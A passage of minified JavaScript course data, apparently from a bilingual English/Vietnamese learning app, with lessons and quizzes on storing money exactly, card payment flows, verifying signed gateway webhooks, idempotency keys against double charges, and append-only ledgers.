class",meaning:"Shared code for close relatives; only one parent allowed"},{term:"Default interface method",meaning:"C# 8+: add a method to an interface without breaking old classes"}]},{title:"Patterns",items:[{term:"Strategy",meaning:"Each algorithm version in its own class; swap them freely"},{term:"Factory",meaning:"One place that decides which object to create"},{term:"Observer",meaning:"Raise an event; many subscribers react"},{term:"Decorator",meaning:"Wrap with the same interface to add logging, caching and more"},{term:"Adapter",meaning:"Make a third-party API fit your own interface"},{term:"Singleton",meaning:"Only one instance; prefer a DI singleton lifetime over static access"}]},{title:"Smells",items:[{term:"Same switch on type in many places",meaning:"Move each case into its own class"},{term:"Deep inheritance tree",meaning:"Hard to change; switch to composition"},{term:"Global mutable state",meaning:"Leaks between tests and requests"},{term:"Subscribe without unsubscribe",meaning:"Memory leak; old objects stay alive"},{term:"Patternitis",meaning:"Patterns with no real need; more files, less clarity"}]}]},ee=Object.freeze(Object.defineProperty({__proto__:null,default:$},Symbol.toStringTag,{value:"Module"})),te={id:"payments",group:"domain",title:"Banking & Payments",emoji:"💳",tagline:`Move money safely, exactly once, and prove it.
VI: Chuyển tiền an toàn, đúng một lần và đối soát được.`,lessons:[{id:"payments.money",title:"Money in code · Tiền trong code",summary:`Store amounts exactly, always with a currency.
VI: Lưu số tiền chính xác, luôn kèm loại tiền tệ.`,minutes:4,blocks:[{type:"text",text:"Never store money in a **float** or `double`. These types keep numbers in binary, so many decimal amounts are not exact.\nVI: Đừng bao giờ lưu tiền bằng kiểu **float** hay `double`. Các kiểu này lưu số dạng nhị phân, nên nhiều số thập phân bị lệch."},{type:"code",code:{lang:"ts",text:`// TypeScript number is a binary float
0.1 + 0.2;          // 0.30000000000000004
0.1 + 0.2 === 0.3;  // false`}},{type:"compare",left:{title:"Decimal type ✅",items:["C# `decimal`, SQL `DECIMAL(19,4)`",`Exact for amounts like 10.50
VI: Chính xác với số như 10.50`,`Easy to read in the database
VI: Dễ đọc khi xem dữ liệu`]},right:{title:"Integer minor units ✅",items:["Store 10.50 USD as `1050` cents\nVI: Lưu 10.50 USD thành `1050` cent",`Exact and fast in any language
VI: Chính xác, nhanh, ngôn ngữ nào cũng dùng được`,`You must know the decimals of each currency
VI: Phải biết mỗi loại tiền có mấy số lẻ`]}},{type:"text",text:`A **minor unit** is the small part of a currency: 1 USD = 100 cents. In practice VND has no minor unit, so 50,000 VND is stored as 50000.
Every amount also needs a **currency code** from ISO 4217, the world list of codes.
VI: **Đơn vị lẻ** là phần nhỏ của một đồng tiền: 1 USD = 100 cent. Trên thực tế VND không có đơn vị lẻ, nên 50.000 VND lưu là 50000.
VI: Mỗi số tiền còn cần **mã tiền tệ** theo ISO 4217, danh sách mã tiền tệ quốc tế.`},{type:"diagram",text:` Code  Decimals  Shown        Stored (int)
 ────  ────────  ───────────  ────────────
 USD   2         10.50 USD    1050
 VND   0         50,000 VND   50000
 JPY   0         500 JPY      500`},{type:"example",title:"Splitting a voucher",text:`A 100,000 VND voucher is split over 3 order lines. Each line gets 33,333, and 1 VND is lost. The fix: give the remainder to one line, so the total stays 100,000.
VI: Một voucher 100.000 VND được chia cho 3 dòng hàng. Mỗi dòng nhận 33.333 và bị mất 1 VND. Cách sửa: dồn phần dư vào một dòng để tổng vẫn là 100.000.`},{type:"diagram",text:` 100,000 / 3 = 33,333  remainder 1
 ┌────────┬────────┬────────┐
 │ 33,334 │ 33,333 │ 33,333 │ = 100,000
 └────────┴────────┴────────┘
   ▲ remainder goes to line 1

 Naive: 33,333 x 3 = 99,999 (1 lost)`},{type:"code",code:{lang:"ts",text:`// Split a whole amount into n parts
function allocate(total: number, n: number) {
  const base = Math.floor(total / n);
  const rest = total - base * n;
  return Array.from({ length: n }, (_, i) =>
    i < rest ? base + 1 : base);
}
allocate(100000, 3); // [33334, 33333, 33333]`}},{type:"text",text:"IT side: store `Amount` together with `Currency CHAR(3)`. Ask the business: which currencies? How do we round tax and discounts? Which line gets the remainder?\nVI: Phía IT: lưu `Amount` cùng với `Currency CHAR(3)`. Hỏi nghiệp vụ: dùng những loại tiền nào? Làm tròn thuế và chiết khấu ra sao? Dòng nào nhận phần dư?"}],remember:`Money = exact number + currency code. The parts must add up to the total.
VI: Tiền = số chính xác + mã tiền tệ. Các phần chia ra phải cộng lại đúng bằng tổng.`,questions:[{id:"payments.money.1",kind:"code",difficulty:"easy",prompt:`What does this TypeScript code print?
VI: Đoạn code TypeScript này in ra gì?`,code:{lang:"ts",text:`let total = 0;
for (let i = 0; i < 10; i++) total += 0.1;
console.log(total === 1);`},choices:["true","false","1","An error"],answer:1,why:`0.1 is not exact in binary, so the sum is 0.9999999999999999, not 1. Use integer minor units or a decimal type for money.
VI: 0,1 không biểu diễn chính xác ở dạng nhị phân, nên tổng là 0.9999999999999999 chứ không phải 1. Hãy dùng số nguyên theo đơn vị lẻ hoặc kiểu decimal cho tiền.`},{id:"payments.money.2",kind:"scenario",difficulty:"medium",prompt:"The `Payments` table has an `Amount` column and no currency column. The company now also sells in USD. What breaks?\nVI: Bảng `Payments` có cột `Amount` nhưng không có cột loại tiền. Công ty bắt đầu bán thêm bằng USD. Điều gì hỏng?",choices:[`Nothing, one amount column works for every currency
VI: Không gì cả, một cột số tiền dùng cho mọi loại tiền`,`A row cannot tell if 100 means 100 VND or 100 USD
VI: Không biết 100 là 100 VND hay 100 USD`,`Only the reports get slower because there are more rows
VI: Chỉ báo cáo chạy chậm hơn vì nhiều dòng hơn`,`The database rejects any amount that has decimals
VI: Database từ chối mọi số tiền có số lẻ`],answer:1,why:`An amount without a currency has no meaning. Totals will mix VND and USD. Store a currency code next to every amount.
VI: Số tiền không có loại tiền thì vô nghĩa. Tổng cộng sẽ trộn lẫn VND và USD. Hãy lưu mã tiền tệ cạnh mỗi số tiền.`},{id:"payments.money.3",kind:"scenario",difficulty:"medium",prompt:`A 100,000 VND discount is split over 3 order lines. Which split is correct?
VI: Chiết khấu 100.000 VND được chia cho 3 dòng hàng. Cách chia nào đúng?`,choices:["33,333 + 33,333 + 33,333","33,334 + 33,333 + 33,333","33,333.33 on each line","33,333 and drop the rest"],answer:1,why:`The parts must add up to exactly 100,000. VND has no decimals in practice, so the remainder of 1 goes to one line.
VI: Các phần phải cộng lại đúng 100.000. Thực tế VND không có số lẻ, nên phần dư 1 đồng được dồn vào một dòng.`},{id:"payments.money.4",kind:"truefalse",difficulty:"hard",prompt:`With integer minor units, you always multiply the amount by 100.
VI: Khi lưu bằng số nguyên theo đơn vị lẻ, luôn nhân số tiền với 100.`,choices:["True","False"],answer:1,why:`It depends on the currency. USD has 2 decimals (×100), VND and JPY have 0 (×1), and a few currencies have 3 (×1000).
VI: Tùy loại tiền. USD có 2 số lẻ (×100), VND và JPY có 0 (×1), và một vài loại tiền có 3 số lẻ (×1000).`}]},{id:"payments.flow",title:"The payment flow · Luồng thanh toán",summary:`Authorize, capture, settle, and how money goes back.
VI: Cấp phép, thu tiền, quyết toán, và cách trả tiền lại.`,minutes:5,blocks:[{type:"text",text:`A card payment has three steps.
**Authorize**: the bank checks the card and puts a **hold** on the money. Nothing moves yet.
**Capture**: the shop says "take the held money now".
**Settle**: later, the banks really move the money to the shop.
VI: Thanh toán thẻ có ba bước.
VI: **Authorize** (cấp phép): ngân hàng kiểm tra thẻ và **giữ** (tạm khóa) số tiền. Tiền chưa đi đâu cả.
VI: **Capture** (thu tiền): cửa hàng báo "lấy số tiền đang giữ ngay".
VI: **Settle** (quyết toán): sau đó các ngân hàng mới thật sự chuyển tiền cho cửa hàng.`},{type:"diagram",text:` Step       Customer card   Shop bank
 ─────────  ──────────────  ──────────
 Authorize  500k on hold    nothing
 Capture    500k taken      not yet
 Settle     -               + 500k
                            (minus fee)`},{type:"example",title:"Hotel booking",text:`A hotel authorizes 2,000,000 VND at check-in. At check-out the real bill is 1,800,000 VND. It captures 1,800,000, and the rest of the hold is released.
VI: Khách sạn cấp phép giữ 2.000.000 VND khi nhận phòng. Khi trả phòng, hóa đơn thật là 1.800.000 VND. Khách sạn thu 1.800.000, phần giữ còn lại được trả về.`},{type:"compare",left:{title:"Void · Hủy",items:[`Cancels before the money is taken
VI: Hủy trước khi tiền bị lấy`,`The hold is released
VI: Số tiền giữ được nhả ra`,`The customer is never charged
VI: Khách không bị trừ tiền`]},right:{title:"Refund · Hoàn tiền",items:[`Money was already taken
VI: Tiền đã bị lấy`,`A new transaction sends it back
VI: Một giao dịch mới trả tiền lại`,`Can be partial, often takes days
VI: Có thể hoàn một phần, thường mất vài ngày`]}},{type:"text",text:`Other methods work differently. With a **bank transfer**, the customer pushes the money. There is no hold, so a refund is a new transfer out.
With an **e-wallet** (for example MoMo or ZaloPay), the customer confirms in the app. The wallet then tells your server the result.
VI: Các phương thức khác chạy khác. Với **chuyển khoản**, khách tự đẩy tiền đi. Không có bước giữ tiền, nên hoàn tiền là một lần chuyển khoản mới.
VI: Với **ví điện tử** (ví dụ MoMo hay ZaloPay), khách xác nhận trong app. Sau đó ví báo kết quả về máy chủ của bạn.`},{type:"diagram",text:` ┌─────────┐  paid   ┌───────────┐
 │ Pending ├────────►│ Succeeded │
 └────┬────┘         └─────┬─────┘
      │ declined /         │ refund
      │ expired            ▼
      ▼              ┌───────────┐
 ┌─────────┐         │ Refunded  │
 │ Failed  │         └───────────┘
 └─────────┘
 No arrow goes back to Pending.`},{type:"text",text:"IT side: a `Payments` table with `OrderId`, `Amount`, `Currency`, `Method`, `Status` and `GatewayTxnId`. Allow only the arrows in the diagram.\nAsk the business: can a refund be partial? Who approves it? How long can a hold wait before capture?\nVI: Phía IT: bảng `Payments` có `OrderId`, `Amount`, `Currency`, `Method`, `Status` và `GatewayTxnId`. Chỉ cho phép các mũi tên trong sơ đồ.\nVI: Hỏi nghiệp vụ: có hoàn tiền một phần không? Ai duyệt hoàn tiền? Giữ tiền được bao lâu trước khi thu?"}],remember:`Authorize holds, capture takes, settle moves. Void before capture, refund after.
VI: Cấp phép là giữ, capture là lấy, settle là chuyển. Chưa thu thì hủy (void), thu rồi thì hoàn tiền (refund).`,questions:[{id:"payments.flow.1",kind:"mcq",difficulty:"easy",prompt:`A card payment is authorized but not captured. Where is the money?
VI: Thanh toán thẻ đã cấp phép nhưng chưa capture. Tiền đang ở đâu?`,choices:[`Already in the shop's bank account
VI: Đã nằm trong tài khoản cửa hàng`,`Still on the card, but on hold
VI: Vẫn ở thẻ, nhưng đang bị giữ`,`In the payment gateway's own account
VI: Trong tài khoản riêng của cổng thanh toán`,`Already sent back to the customer
VI: Đã được trả lại cho khách`],answer:1,why:`Authorize only reserves the money with a hold. The money moves after capture and settlement.
VI: Cấp phép chỉ giữ chỗ số tiền. Tiền chỉ di chuyển sau khi capture và quyết toán.`},{id:"payments.flow.2",kind:"scenario",difficulty:"medium",prompt:`An order was authorized but not yet captured. The customer cancels one hour later. What is the right action?
VI: Đơn hàng đã cấp phép nhưng chưa capture. Một giờ sau khách hủy đơn. Nên làm gì?`,choices:["Void the authorization","Create a refund","Capture first, then refund","Wait for the hold to expire"],answer:0,why:`Nothing was captured, so there is nothing to refund. A void releases the hold now. Waiting for expiry leaves the customer's money blocked for days.
VI: Chưa capture thì chưa có gì để hoàn. Void nhả số tiền giữ ngay. Chờ hết hạn thì tiền của khách bị khóa nhiều ngày.`},{id:"payments.flow.3",kind:"debug",difficulty:"hard",prompt:'An order shows `Succeeded`, but it was refunded last week. Logs show a late "payment succeeded" message arrived after the refund. What is the root cause?\nVI: Đơn hàng hiện `Succeeded` dù đã hoàn tiền tuần trước. Log cho thấy một thông báo "thanh toán thành công" đến muộn, sau khi hoàn tiền. Nguyên nhân gốc là gì?',choices:[`The code lets any status change to any other status
VI: Code cho phép mọi trạng thái đổi sang mọi trạng thái khác`,`The database lost the row that said Refunded
VI: Database bị mất dòng ghi trạng thái Refunded`,`The gateway sent the wrong amount in its message
VI: Cổng thanh toán gửi sai số tiền trong thông báo`,`The customer paid for the same order a second time
VI: Khách đã trả tiền đơn này lần thứ hai`],answer:0,why:`Without status rules, a late message moved Refunded back to Succeeded. Allow only valid arrows, and ignore messages that would go backwards.
VI: Không có luật chuyển trạng thái nên thông báo đến muộn đưa Refunded về lại Succeeded. Chỉ cho phép các bước hợp lệ và bỏ qua thông báo làm trạng thái đi lùi.`},{id:"payments.flow.4",kind:"truefalse",difficulty:"medium",prompt:`A shop can "void" a normal bank transfer, just like a card authorization.
VI: Cửa hàng có thể "void" một lần chuyển khoản thường, giống như cấp phép thẻ.`,choices:["True","False"],answer:1,why:`In a bank transfer the customer pushes the money, and there is no hold. To give money back, the shop makes a new transfer, which is a refund.
VI: Với chuyển khoản, khách tự đẩy tiền đi và không có bước giữ tiền. Muốn trả lại, cửa hàng phải chuyển khoản mới, tức là hoàn tiền.`}]},{id:"payments.gateway",title:"Gateways and webhooks · Cổng thanh toán và webhook",summary:`The browser can lie. Trust the signed server message.
VI: Trình duyệt có thể bị sửa. Hãy tin thông báo có chữ ký từ máy chủ.`,minutes:5,blocks:[{type:"text",text:`A **payment gateway** connects your shop to banks and wallets. Examples are VNPay, MoMo and Stripe. Most use a **redirect flow**: the customer leaves your site to pay.
VI: **Cổng thanh toán** kết nối cửa hàng của bạn với ngân hàng và ví. Ví dụ VNPay, MoMo, Stripe. Đa số dùng **luồng chuyển hướng**: khách rời trang của bạn để thanh toán.`},{type:"diagram",text:` 1 Shop ──create payment──► Gateway
 2 Browser ──redirect──► Gateway page
 3 Gateway ──charge──► Bank
 4 Bank ──OK──► Gateway
 5 Gateway ══IPN, server to server══► Shop
 6 Gateway ──redirect──► Browser
   Browser ──opens Return URL──► Shop`},{type:"text",text:`**Return URL** (step 6): the browser comes back with the result in the URL. Anyone can type or edit that URL, so it is **not proof** of payment.
**IPN** (Instant Payment Notification), also called a **webhook** (step 5): the gateway's server calls your server. It carries a **signature** made with a secret key.
VI: **Return URL** (bước 6): trình duyệt quay về kèm kết quả trên URL. Ai cũng có thể gõ hay sửa URL đó, nên nó **không phải bằng chứng** đã thanh toán.
VI: **IPN** (thông báo thanh toán tức thời), còn gọi là **webhook** (bước 5): máy chủ cổng thanh toán gọi máy chủ của bạn. Nó kèm **chữ ký** tạo bằng khóa bí mật.`},{type:"code",code:{lang:"http",text:`POST /payments/ipn HTTP/1.1
Content-Type: application/json

{
  "orderId": "SO-1001",
  "amount": 500000,
  "resultCode": 0,
  "transId": "4088123",
  "signature": "9f2c...e41"
}`}},{type:"list",items:[`1. Verify the signature with your secret key. Bad → reject.
VI: 1. Kiểm tra chữ ký bằng khóa bí mật. Sai → từ chối.`,`2. Find the order. Unknown order → reject.
VI: 2. Tìm đơn hàng. Không có đơn → từ chối.`,`3. Check that amount and currency match the order.
VI: 3. Kiểm tra số tiền và loại tiền khớp với đơn.`,`4. Already processed? Reply OK and change nothing.
VI: 4. Đã xử lý rồi? Trả lời OK và không đổi gì.`,`5. Update the status and save the raw message.
VI: 5. Cập nhật trạng thái và lưu nguyên văn thông báo.`,`6. Reply in the format the gateway expects.
VI: 6. Trả lời đúng định dạng cổng thanh toán yêu cầu.`]},{type:"example",title:"Closed the app too early",text:`A customer pays with MoMo, then closes the app before the redirect. The Return URL is never opened. The IPN still arrives, so the order is marked paid.
VI: Khách trả bằng MoMo rồi tắt app trước khi được chuyển về. Return URL không bao giờ được mở. IPN vẫn đến, nên đơn vẫn được ghi nhận đã trả.`},{type:"text",text:`Still not sure? No IPN after some minutes? Call the gateway's **query API** to ask for the real status. Ask the business: how long do we wait before we cancel an unpaid order?
VI: Vẫn chưa chắc? Vài phút chưa thấy IPN? Gọi **API truy vấn** của cổng thanh toán để hỏi trạng thái thật. Hỏi nghiệp vụ: chờ bao lâu thì hủy đơn chưa thanh toán?`}],remember:`Return URL shows a page. The signed IPN decides if the order is paid.
VI: Return URL chỉ để hiển thị trang. IPN có chữ ký mới quyết định đơn đã trả tiền hay chưa.`,questions:[{id:"payments.gateway.1",kind:"scenario",difficulty:"easy",prompt:"Your return page reads `?status=success` from the URL and marks the order paid. What is the risk?\nVI: Trang return đọc `?status=success` trên URL rồi đánh dấu đơn đã trả. Rủi ro là gì?",choices:[`Anyone can edit the URL and get goods for free
VI: Ai cũng sửa được URL và lấy hàng miễn phí`,`The page loads a bit slower for mobile users
VI: Trang tải chậm hơn một chút trên điện thoại`,`The gateway will charge the customer twice
VI: Cổng thanh toán sẽ trừ tiền khách hai lần`,`No risk, since the gateway built the URL
VI: Không rủi ro, vì cổng thanh toán tạo URL đó`],answer:0,why:`The URL comes from the browser, and the user controls the browser. Only a verified IPN or a query to the gateway proves payment.
VI: URL đến từ trình duyệt, mà trình duyệt do người dùng kiểm soát. Chỉ IPN đã xác thực hoặc truy vấn cổng thanh toán mới chứng minh đã trả tiền.`},{id:"payments.gateway.2",kind:"debug",difficulty:"medium",prompt:"Some paid orders stay `Pending`. Logs show IPN calls arriving, and your endpoint returns 401 to all of them. What is the likely cause?\nVI: Một số đơn đã trả vẫn `Pending`. Log cho thấy IPN có đến, nhưng endpoint trả 401 cho tất cả. Nguyên nhân có thể là gì?",choices:[`The IPN endpoint requires a user login token
VI: Endpoint IPN đòi token đăng nhập của người dùng`,`The customers paid with cards that had expired
VI: Khách thanh toán bằng thẻ đã hết hạn sử dụng`,`The Return URL points to the wrong page of the shop
VI: Return URL trỏ sai trang của cửa hàng`,`The Orders table is missing an index on OrderId
VI: Bảng Orders thiếu index trên cột OrderId`],answer:0,why:`The gateway is a server, not a logged-in user. Protect the IPN endpoint with the signature check, not with user login.
VI: Cổng thanh toán là máy chủ, không phải người dùng đã đăng nhập. Hãy bảo vệ endpoint IPN bằng kiểm tra chữ ký, không bằng đăng nhập.`},{id:"payments.gateway.3",kind:"scenario",difficulty:"medium",prompt:`An IPN has a valid signature, but the amount is 5,000 VND. The order total is 500,000 VND. What should the handler do?
VI: IPN có chữ ký hợp lệ nhưng số tiền là 5.000 VND. Tổng đơn là 500.000 VND. Handler nên làm gì?`,choices:[`Mark it paid, because the signature is valid
VI: Ghi nhận đã trả, vì chữ ký hợp lệ`,`Do not mark it paid; flag it for review
VI: Không ghi nhận đã trả; đánh dấu để kiểm tra`,`Change the order total to 5,000 VND
VI: Sửa tổng đơn thành 5.000 VND`,`Ignore it and delete the message log
VI: Bỏ qua và xóa log thông báo`],answer:1,why:`A valid signature proves who sent the message, not that the amount is right. The amount and currency must match the order.
VI: Chữ ký hợp lệ chỉ chứng minh ai gửi, không chứng minh số tiền đúng. Số tiền và loại tiền phải khớp với đơn.`},{id:"payments.gateway.4",kind:"compare",difficulty:"hard",prompt:`The customer paid 10 minutes ago, but no IPN has arrived. Which action is best?
VI: Khách trả tiền 10 phút trước nhưng chưa có IPN. Cách làm nào tốt nhất?`,choices:[`Mark the order Failed right now
VI: Đánh dấu đơn Failed ngay`,`Ask the gateway's query API for the status
VI: Hỏi trạng thái qua API truy vấn của cổng`,`Trust a screenshot sent by the customer
VI: Tin ảnh chụp màn hình khách gửi`,`Keep waiting for the IPN forever
VI: Tiếp tục chờ IPN mãi mãi`],answer:1,why:`IPNs can be late or lost. The query API gives the real status from the gateway. A screenshot is easy to fake.
VI: IPN có thể đến muộn hoặc bị mất. API truy vấn trả trạng thái thật từ cổng thanh toán. Ảnh chụp màn hình rất dễ làm giả.`},{id:"payments.gateway.5",kind:"truefalse",difficulty:"easy",prompt:`The same IPN can reach your server more than once.
VI: Cùng một IPN có thể đến máy chủ của bạn nhiều hơn một lần.`,choices:["True","False"],answer:0,why:`Gateways often retry when your reply is slow or wrong. So the handler must be safe to run twice for the same payment.
VI: Cổng thanh toán thường gửi lại khi bạn trả lời chậm hoặc sai. Vì vậy handler phải chạy hai lần cho cùng giao dịch mà không sao.`}]},{id:"payments.once",title:"Paying exactly once · Thanh toán đúng một lần",summary:`Stop double charges from double clicks and retries.
VI: Chặn trừ tiền hai lần do bấm đúp và gửi lại.`,minutes:5,blocks:[{type:"text",text:`The Distributed Systems topic explains idempotency in general. Here we apply it to money, where a duplicate costs the customer real cash.
VI: Chủ đề Distributed Systems đã giải thích idempotency (gọi nhiều lần vẫn như một lần). Ở đây ta áp dụng cho tiền, nơi một lần trùng làm khách mất tiền thật.`},{type:"diagram",text:` App           Server         Gateway
  ├─ Pay 500k ─►├─ charge ────►│ OK
  │  (timeout)  │◄─ reply lost ┤
  ├─ retry ────►├─ charge ────►│ OK
  ▼
 Charged twice: 1,000,000 VND`},{type:"text",text:`An **idempotency key** is a unique id for one payment attempt. The client creates it once and sends the same key on every retry. The server saves it with a **unique constraint**, so a second row with that key is rejected.
VI: **Idempotency key** (khóa chống lặp) là mã duy nhất cho một lần thanh toán. Client tạo một lần và gửi lại đúng khóa đó mỗi lần thử lại. Server lưu nó với **ràng buộc unique**, nên dòng thứ hai cùng khóa bị từ chối.`},{type:"diagram",text:` Pay(key=K1) ─► new key: charge, save
 Pay(key=K1) ─► key seen: return saved
                result, no new charge`},{type:"code",code:{lang:"sql",text:`CREATE TABLE Payments (
  Id             BIGINT IDENTITY PRIMARY KEY,
  OrderId        BIGINT        NOT NULL,
  IdempotencyKey VARCHAR(64)   NOT NULL UNIQUE,
  Amount         DECIMAL(19,4) NOT NULL,
  Currency       CHAR(3)       NOT NULL,
  Status         VARCHAR(20)   NOT NULL
);
-- At most one successful payment per order
CREATE UNIQUE INDEX UX_Payments_Paid
  ON Payments (OrderId)
  WHERE Status = 'Succeeded';`}},{type:"compare",left:{title:"Timeout → Failed ⚠️",items:[`Maybe the charge did happen
VI: Có thể tiền đã bị trừ`,`Customer pays again: charged twice
VI: Khách trả lại: bị trừ hai lần`]},right:{title:"Timeout → Unknown ✅",items:[`We do not know yet, and we say so
VI: Chưa biết, và ghi rõ là chưa biết`,`Ask the query API or wait for the IPN
VI: Hỏi API truy vấn hoặc chờ IPN`]}},{type:"example",title:"Slow 3G",text:`A customer taps "Pay" on a slow connection. Nothing happens, so they tap again. Both taps carry the same key from the checkout page. The customer is charged once.
VI: Khách bấm "Thanh toán" khi mạng chậm. Không thấy gì nên bấm lần nữa. Cả hai lần đều mang cùng một khóa từ trang thanh toán. Khách chỉ bị trừ tiền một lần.`},{type:"text",text:`Ask the business: can one order be paid in two parts? If yes, the "one success per order" rule must change. Also send a unique reference to the gateway, so it can block duplicates too.
VI: Hỏi nghiệp vụ: một đơn có được trả làm hai lần không? Nếu có, luật "mỗi đơn một lần thành công" phải đổi. Hãy gửi thêm mã tham chiếu duy nhất cho cổng thanh toán để họ cũng chặn trùng.`}],remember:`Same attempt, same key. After a timeout the status is Unknown, not Failed.
VI: Cùng một lần thanh toán thì cùng một khóa. Sau timeout, trạng thái là Chưa rõ, không phải Thất bại.`,questions:[{id:"payments.once.1",kind:"scenario",difficulty:"easy",prompt:`The Pay button is disabled after the first click. Is that enough to stop double charges?
VI: Nút Thanh toán bị khóa sau lần bấm đầu. Như vậy đã đủ chặn trừ tiền hai lần chưa?`,choices:[`Yes, a disabled button blocks every duplicate
VI: Đủ, nút bị khóa chặn được mọi lần trùng`,`No, retries and a second tab can still repeat it
VI: Chưa, việc gửi lại và tab thứ hai vẫn có thể lặp`,`Yes, as long as the page also shows a spinner
VI: Đủ, miễn là trang có hiện biểu tượng chờ`,`No, because browsers cannot disable buttons
VI: Chưa, vì trình duyệt không khóa được nút`],answer:1,why:`The button helps, but network retries, a refresh or a second tab can still send the request again. The server must block duplicates with a key.
VI: Khóa nút có giúp, nhưng gửi lại do mạng, tải lại trang hay tab thứ hai vẫn gửi lại yêu cầu. Server phải chặn trùng bằng khóa.`},{id:"payments.once.2",kind:"debug",difficulty:"medium",prompt:"Order 1001 has two `Succeeded` payments, 3 seconds apart, with different idempotency keys. What is the likely bug?\nVI: Đơn 1001 có hai payment `Succeeded`, cách nhau 3 giây, với hai idempotency key khác nhau. Lỗi có thể là gì?",choices:[`The client makes a new key on every retry
VI: Client tạo khóa mới mỗi lần gửi lại`,`The gateway ignores the order amount
VI: Cổng thanh toán bỏ qua số tiền của đơn`,`The server clock is 3 seconds behind
VI: Đồng hồ máy chủ chậm 3 giây`,`The unique index on the key is too slow
VI: Unique index trên khóa chạy quá chậm`],answer:0,why:`A key only works if it stays the same across retries. A new key looks like a new payment. A unique index on paid orders would also stop the second one.
VI: Khóa chỉ có tác dụng khi giữ nguyên qua các lần gửi lại. Khóa mới trông như một lần thanh toán mới. Unique index cho đơn đã trả cũng sẽ chặn lần thứ hai.`},{id:"payments.once.3",kind:"compare",difficulty:"medium",prompt:`Your call to the gateway times out after 30 seconds. Which is safer?
VI: Lời gọi tới cổng thanh toán bị timeout sau 30 giây. Cách nào an toàn hơn?`,choices:[`Mark it Failed so the customer can pay again
VI: Ghi Failed để khách trả lại lần nữa`,`Mark it Unknown and check with the gateway
VI: Ghi Chưa rõ rồi kiểm tra với cổng`,`Mark it Succeeded, since most payments work
VI: Ghi Succeeded, vì đa số đều thành công`,`Retry at once with a new idempotency key
VI: Gửi lại ngay với idempotency key mới`],answer:1,why:`A timeout means "no answer", not "no charge". Failed invites a second charge, and a new key removes the protection.
VI: Timeout nghĩa là "chưa có trả lời", không phải "chưa trừ tiền". Ghi Failed dễ dẫn tới trừ tiền lần hai, còn khóa mới thì mất tác dụng chống trùng.`},{id:"payments.once.4",kind:"code",difficulty:"hard",prompt:`What happens when this script runs?
VI: Điều gì xảy ra khi chạy đoạn script này?`,code:{lang:"sql",text:`CREATE UNIQUE INDEX UX_Paid
  ON Payments (OrderId)
  WHERE Status = 'Succeeded';

INSERT Payments (OrderId, Status)
VALUES (7, 'Failed');     -- row 1
INSERT Payments (OrderId, Status)
VALUES (7, 'Succeeded');  -- row 2
INSERT Payments (OrderId, Status)
VALUES (7, 'Succeeded');  -- row 3`},choices:["All three rows are saved","Row 1 fails, rows 2 and 3 are saved","Rows 1 and 2 are saved, row 3 fails","Only row 1 is saved"],answer:2,why:`The filtered index only covers rows with Status Succeeded. A failed attempt is allowed, but a second success for order 7 breaks the unique rule.
VI: Index có lọc chỉ áp cho dòng Succeeded. Lần thất bại vẫn được lưu, nhưng lần thành công thứ hai của đơn 7 vi phạm ràng buộc unique.`}]},{id:"payments.ledger",title:"Ledgers and balances · Sổ cái và số dư",summary:`A balance is a sum of entries, never a number you overwrite.
VI: Số dư là tổng các bút toán, không phải con số bị ghi đè.`,minutes:5,blocks:[{type:"text",text:`A **ledger** is a list of money movements. Each row is an **entry**. You only add rows; you never edit or delete them. A wrong entry is fixed by a new, opposite entry.
VI: **Sổ cái** (ledger) là danh sách các lần tiền đi và đến. Mỗi dòng là một **bút toán**. Chỉ thêm dòng, không sửa hay xóa. Bút toán sai được sửa bằng một bút toán ngược lại.`},{type:"diagram",text:` WalletEntries (wallet W1)
 ┌────┬─────────────┬──────────┐
 │ Id │ Reason      │ Amount   │
 ├────┼─────────────┼──────────┤
 │ 1  │ Top-up      │ +500,000 │
 │ 2  │ Pay SO-1001 │ -120,000 │
 │ 3  │ Refund 1001 │ +120,000 │
 │ 4  │ Pay SO-1002 │  -80,000 │
 └────┴─────────────┴──────────┘
 Balance = SUM(Amount) = 420,000`},{type:"text",text:`**Double-entry**: a transfer always writes two entries. One account goes down, the other goes up by the same amount. So money is never created or lost inside the system.
VI: **Bút toán kép**: mỗi lần chuyển tiền luôn ghi hai bút toán. Một tài khoản giảm, tài khoản kia tăng đúng số đó. Nhờ vậy tiền không tự sinh ra hay mất đi trong hệ thống.`},{type:"diagram",text:` Transfer T9: A sends 100,000 to B
 ┌──────┬─────────┬──────────┐
 │ Txn  │ Account │ Amount   │
 ├──────┼─────────┼──────────┤
 │ T9   │ A       │ -100,000 │
 │ T9   │ B       │ +100,000 │
 └──────┴─────────┴──────────┘
           Sum of T9 = 0`},{type:"compare",left:{title:"SET Balance = 500 ⚠️",items:[`No history: why 500?
VI: Không có lịch sử: vì sao là 500?`,`Two updates at once: one is lost
VI: Hai lệnh cùng lúc: mất một lệnh`,`Hard to audit or reconcile
VI: Khó kiểm toán, khó đối soát`]},right:{title:"INSERT an entry ✅",items:[`Every change is kept
VI: Mọi thay đổi đều được giữ lại`,`Balance can be rebuilt any time
VI: Tính lại số dư bất cứ lúc nào`,`Support can explain each number
VI: CSKH giải thích được từng con số`]}},{type:"example",title:"Two devices, one wallet",text:`Balance is 100,000. A user taps "Withdraw 80,000" on a phone and a laptop at the same moment. Both read 100,000, and both pass the check.
VI: Số dư là 100.000. Người dùng bấm "Rút 80.000" trên điện thoại và laptop cùng lúc. Cả hai đều đọc được 100.000 và đều qua bước kiểm tra.`},{type:"text",text:"Fix: lock the wallet row, check, then write, all in one transaction. The second request waits, sees 20,000, and is rejected. Many systems also keep a cached `Balance` column for speed. It changes only together with a new entry.\nVI: Cách sửa: khóa dòng ví, kiểm tra, rồi ghi, tất cả trong một transaction. Yêu cầu thứ hai phải chờ, thấy còn 20.000 và bị từ chối. Nhiều hệ thống có thêm cột `Balance` lưu sẵn cho nhanh. Cột này chỉ đổi cùng lúc với một bút toán mới."},{type:"code",code:{lang:"sql",text:`BEGIN TRAN;
-- Lock this wallet row until COMMIT
SELECT Balance FROM Wallets WITH (UPDLOCK)
WHERE Id = @walletId;
-- If Balance < @amount: ROLLBACK and reject
INSERT WalletEntries (WalletId, TxnId, Amount)
VALUES (@walletId, @txnId, -@amount);
UPDATE Wallets SET Balance = Balance - @amount
WHERE Id = @walletId;
COMMIT;`}}],remember:`Balance = sum of entries. Add rows, never overwrite. Lock before you check and spend.
VI: Số dư = tổng bút toán. Chỉ thêm dòng, không ghi đè. Khóa trước khi kiểm tra và trừ tiền.`,questions:[{id:"payments.ledger.1",kind:"mcq",difficulty:"easy",prompt:`A customer asks: "Why is my wallet 420,000?" Which design lets support answer?
